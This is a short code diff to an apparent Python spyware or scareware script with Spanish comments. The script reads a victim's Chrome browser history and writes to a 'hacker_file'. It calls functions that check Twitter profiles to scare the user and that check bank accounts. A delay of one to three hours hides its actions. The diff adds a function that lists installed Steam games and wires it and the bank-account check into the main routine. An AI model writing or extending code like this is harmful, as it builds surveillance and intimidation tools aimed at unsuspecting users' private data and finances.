@@ -13,6 +13,12 @@ def get_user_path():
     return "{}/".format(Path.home())
 
 
+def chaeck_steam_games(hacker_file):
+    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common"
+    games = os.listdir(steam_path)
+    print(games)
+
+
 def delay_action():
     # Esperaremos entre 1 y 3 horas
     n_hours = randrange(1, 4)
@@ -76,6 +82,8 @@ def main():
     chrome_history = get_chrome_history(user_path)
     # Escribiendo mensajes
     check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
+    check_bank_account(hacker_file, chrome_history)
+    chaeck_steam_games(hacker_file)
 
 
 if __name__ == "__main__":
